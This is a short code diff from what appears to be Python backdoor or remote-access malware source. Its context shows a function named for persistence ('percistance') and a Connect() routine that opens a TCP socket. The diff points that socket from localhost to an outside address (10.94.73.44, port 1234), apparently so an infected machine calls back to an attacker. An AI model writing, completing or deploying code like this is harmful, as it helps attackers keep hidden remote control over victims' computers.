@@ -31,7 +31,7 @@ def percistance (tempdir, fileName, run):
 
 def Connect():
 
-    host = "localhost"
+    host = "10.94.73.44"
     port = 1234
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((host, port))
